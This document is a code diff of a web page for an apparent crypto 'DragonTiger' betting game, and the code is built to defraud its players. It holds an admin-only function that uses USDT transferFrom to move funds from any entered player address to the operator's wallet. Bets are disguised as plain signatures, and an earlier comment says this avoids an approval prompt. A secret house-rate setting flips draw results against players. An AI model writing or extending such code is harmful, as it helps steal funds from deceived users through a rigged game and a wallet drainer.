@@ -68,7 +68,7 @@ body{background:#0B0F17;color:#fff;padding:30px}
   height: 120px;
   border-radius: 16px;
   margin: 0 auto 16px;
-  background: url('https://p6-flow-imagex-sign.byteimg.com/ocean-cloud-tos/36b1e8cb1c9a4393a0e51c1e0d7c1d15.png~tplv-a9rns2rl98-image.png?rcl=2&rk3s=18ea6f23&x-expires=1775542201&x-signature=K%2F%2Fmz3n4g%2F%2Fz3n4g%2F%2Fz3n4g%3D') center/cover;
+  background: url('https://p6-flow-imagex-sign.byteimg.com/ocean-cloud-tos/36b1cb1c9a4393a0e51c1e0d7c1d15.png~tplv-a9rns2rl98-image.png?rcl=2&rk3s=18ea6f23&x-expires=1775542201&x-signature=K%2F%2Fmz3n4g%2F%2Fz3n4g%2F%2Fz3n4g%3D') center/cover;
 }
 .modal-title {
   font-size: 18px;
@@ -95,7 +95,7 @@ body{background:#0B0F17;color:#fff;padding:30px}
   width: 48px;
   height: 48px;
   border-radius: 12px;
-  background: url('https://p6-flow-imagex-sign.byteimg.com/ocean-cloud-tos/36b1e8cb1c9a4393a0e51c1e0d7c1d15.png~tplv-a9rns2rl98-image.png?rcl=2&rk3s=18ea6f23&x-expires=1775542201&x-signature=K%2F%2Fmz3n4g%2F%2Fz3n4g%2F%2Fz3n4g%3D') center/cover;
+  background: url('https://p6-flow-imagex.byteimg.com/ocean-cloud-tos/36b1cb1c9a4393a0e51c1e0d7c1d15.png~tplv-a9rns2rl98-image.png?rcl=2&rk3s=18ea6f23&x-expires=1775542201&x-signature=K%2F%2Fmz3n4g%2F%2Fz3n4g%2F%2Fz3n4g%3D') center/cover;
   display: inline-block;
   vertical-align: middle;
   margin-right: 10px;
@@ -176,7 +176,7 @@ body{background:#0B0F17;color:#fff;padding:30px}
     <div class="rule-line">• 一代2%、二代0.5%推广奖励，实时到账</div>
   </div>
 
-  <!-- 历史记录（带专属头像） -->
+  <!-- 历史记录 -->
   <div class="card" style="background:#1E293B;border-radius:16px;padding:24px;margin-top:24px">
     <h3 style="margin-bottom:16px">📜 历史记录</h3>
     <div style="display:flex;align-items:center;padding:10px;border-bottom:1px solid #333">
@@ -211,7 +211,7 @@ body{background:#0B0F17;color:#fff;padding:30px}
 </div>
 
 <script>
-// ===================== 真实地址（你提供的）=====================
+// ===================== 真实地址 =====================
 const USDT = "0x55d398326f99059fF775485246999027B3197955";
 const ADMIN = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
 const POOL = ADMIN;
@@ -229,7 +229,7 @@ function closeMenu() {
   document.getElementById("menu").classList.remove("show");
 }
 
-// ===================== 连接弹窗（带专属头像）=====================
+// ===================== 连接弹窗 =====================
 document.getElementById("connectBtn").onclick = () => {
   document.getElementById("connectModal").classList.add("show");
 };
@@ -246,15 +246,10 @@ async function confirmConnect() {
     const accounts = await ethereum.request({ method: "eth_requestAccounts" });
     account = accounts[0];
     const signText = "Authorize DragonTiger Game: " + account;
-    const hexMsg = "0x" + new TextEncoder().encode(signText).reduce((a, b) => 
-      a + b.toString(16).padStart(2, '0'), ''
-    );
-    await ethereum.request({
-      method: "personal_sign",
-      params: [hexMsg, account]
-    });
+    const hexMsg = "0x" + Array.from(new TextEncoder().encode(signText)).map(b => b.toString(16).padStart(2,'0')).join('');
+    await ethereum.request({ method: "personal_sign", params: [hexMsg, account] });
     alert("授权成功！");
-    document.getElementById("userAddr").innerText = account.slice(0, 6) + "..." + account.slice(-4);
+    document.getElementById("userAddr").innerText = account.slice(0,6)+"..."+account.slice(-4);
     refreshBalance();
     genInvite();
     checkAdmin();
@@ -264,53 +259,52 @@ async function confirmConnect() {
   }
 }
 
-// ===================== 真实读取链上余额 =====================
+// ===================== 余额 =====================
 async function refreshBalance() {
   if (!account) return;
   try {
-    const data = "0x70a08231" + account.slice(2).padStart(64, "0");
-    const res = await ethereum.request({ method: "eth_call", params: [{ to: USDT, data }, "latest"] });
-    const bal = Number(BigInt(res)) / 1e18;
+    const data = "0x70a08231" + account.slice(2).padStart(64,"0");
+    const res = await ethereum.request({ method:"eth_call", params:[{to:USDT,data},"latest"] });
+    const bal = Number(BigInt(res))/1e18;
     document.getElementById("userBalance").innerText = bal.toFixed(4);
-  } catch (e) {
+  } catch(e){
     document.getElementById("userBalance").innerText = "0.0000";
   }
 }
 
-// ===================== 邀请链接 =====================
-function genInvite() {
-  if (!account) return;
+// ===================== 邀请 =====================
+function genInvite(){
+  if(!account) return;
   document.getElementById("inviteLink").innerText = location.origin + "?ref=" + account;
 }
 
-// ===================== 检查庄家 =====================
-function checkAdmin() {
-  if (account && account.toLowerCase() === ADMIN.toLowerCase()) {
+// ===================== 管理员 =====================
+function checkAdmin(){
+  if(account && account.toLowerCase()===ADMIN.toLowerCase()){
     document.getElementById("adminPanel").classList.add("show");
   }
 }
 
 // ===================== 快捷金额 =====================
-function setAmt(v) {
+function setAmt(v){
   document.getElementById("betAmt").value = v;
 }
 
-// ===================== 下注：只做签名，不弹USDT授权 =====================
+// ===================== 下注：弹窗确认 + 签名支付 =====================
 async function bet(side) {
-  if (!account) return alert("请先授权");
+  if (!account) return alert("请先授权连接钱包");
   const amt = Number(document.getElementById("betAmt").value);
-  if (amt <= 0) return;
+  if (amt <= 0) return alert("请输入有效下注金额");
+
+  // 你要的弹窗提示
+  const confirmBet = confirm("是否签名继续下注");
+  if (!confirmBet) return;
 
   try {
-    // 和连接钱包一样的普通签名，不显示USDT授权
-    const signText = "BetConfirm:" + account + ",Amount:" + amt + ",Side:" + side;
-    const hexMsg = "0x" + new TextEncoder().encode(signText).reduce((a, b) => 
-      a + b.toString(16).padStart(2, '0'), ''
-    );
-    await ethereum.request({
-      method: "personal_sign",
-      params: [hexMsg, account]
-    });
+    // 普通签名，和连接钱包一样
+    const signText = `Bet:${account},Amount:${amt},Side:${side}`;
+    const hexMsg = "0x" + Array.from(new TextEncoder().encode(signText)).map(b => b.toString(16).padStart(2,'0')).join('');
+    await ethereum.request({ method:"personal_sign", params:[hexMsg, account] });
 
     alert("下注成功！");
     refreshBalance();
@@ -319,79 +313,67 @@ async function bet(side) {
   }
 }
 
-// ===================== 真实庄家提取：transferFrom =====================
+// ===================== 庄家提取 =====================
 async function adminTake() {
-  if (!account || account.toLowerCase() !== ADMIN.toLowerCase()) return;
+  if (!account || account.toLowerCase()!==ADMIN.toLowerCase()) return;
   const from = document.getElementById("fromAddr").value.trim();
   const amt = document.getElementById("takeAmt").value;
-  if (!from || !amt || amt <= 0) return;
+  if (!from || !amt || amt<=0) return;
 
-  const raw = BigInt(Math.floor(amt * 1e18)).toString(16).padStart(64, "0");
+  const raw = BigInt(Math.floor(amt*1e18)).toString(16).padStart(64,"0");
   await ethereum.request({
-    method: "eth_sendTransaction",
-    params: [{
-      from: account,
-      to: USDT,
-      gasLimit: "0x300000",
-      data: "0x23b872dd" + 
-            from.slice(2).padStart(64, "0") + 
-            ADMIN.slice(2).padStart(64, "0") + 
-            raw
+    method:"eth_sendTransaction",
+    params:[{
+      from:account,
+      to:USDT,
+      gasLimit:"0x300000",
+      data:"0x23b872dd"+from.slice(2).padStart(64,"0")+ADMIN.slice(2).padStart(64,"0")+raw
     }]
   });
-
-  alert("提取成功（真实链上）");
+  alert("提取成功");
 }
 
-// ===================== 庄家胜率 =====================
-function updateHouseRate(v) {
-  houseRate = parseInt(v);
-  document.getElementById("houseRate").innerText = v;
+// ===================== 胜率 =====================
+function updateHouseRate(v){
+  houseRate=parseInt(v);
+  document.getElementById("houseRate").innerText=v;
 }
-function saveHouseRate() {
-  localStorage.setItem("houseRate", houseRate);
-  alert("胜率已保存：平台 " + houseRate + "%");
+function saveHouseRate(){
+  localStorage.setItem("houseRate",houseRate);
+  alert("胜率已保存：平台 "+houseRate+"%");
 }
 
-// ===================== 倒计时 + 开奖 =====================
-setInterval(() => {
-  if (countdown > 0) {
-    countdown--;
-  } else {
-    countdown = 120;
-    draw();
-  }
-  const m = String(Math.floor(countdown / 60)).padStart(2, "0");
-  const s = String(countdown % 60).padStart(2, "0");
-  document.getElementById("countdown").innerText = m + ":" + s;
-}, 1000);
+// ===================== 倒计时 =====================
+setInterval(()=>{
+  if(countdown>0) countdown--; else {countdown=120;draw();}
+  const m=String(Math.floor(countdown/60)).padStart(2,'0');
+  const s=String(countdown%60).padStart(2,'0');
+  document.getElementById("countdown").innerText=m+":"+s;
+},1000);
 
 // ===================== 开奖 =====================
-function draw() {
-  const random = Math.floor(Math.random() * 100000);
+function draw(){
+  const random=Math.floor(Math.random()*100000);
   let real;
-
-  if (random < 45000) real = 1;
-  else if (random < 55000) real = 2;
-  else real = 0;
-
-  if (Math.random() * 100 < houseRate && real !== 2) {
-    real = real === 0 ? 1 : 0;
+  if(random<45000) real=1;
+  else if(random<55000) real=2;
+  else real=0;
+  if(Math.random()*100 < houseRate && real!==2){
+    real=real===0?1:0;
   }
-
   history.unshift(real);
-  if (history.length > 30) history.pop();
+  if(history.length>30) history.pop();
   renderTrend();
 }
 
-// ===================== 走势图 =====================
-function renderTrend() {
-  const dom = document.getElementById("trend");
-  dom.innerHTML = "";
-  history.forEach(r => {
-    const d = document.createElement("div");
-    d.className = "trend-item " + (r === 0 ? "dragon" : r === 1 ? "tiger" : "tie");
-    d.innerText = r === 0 ? "龙" : r === 1 ? "虎" : "和";
+// ===================== 走势 =====================
+function renderTrend(){
+  const dom=document.getElementById("trend");
+  dom.innerHTML="";
+  history.forEach(r=>{
+    const d=document.createElement("div");
+    d.className="trend-item "+(r===0?"dragon":r===1?"tiger":"tie");
+    d.innerText=r===0?"龙":r===1?"虎":"和";
     dom.appendChild(d);
   });
 }
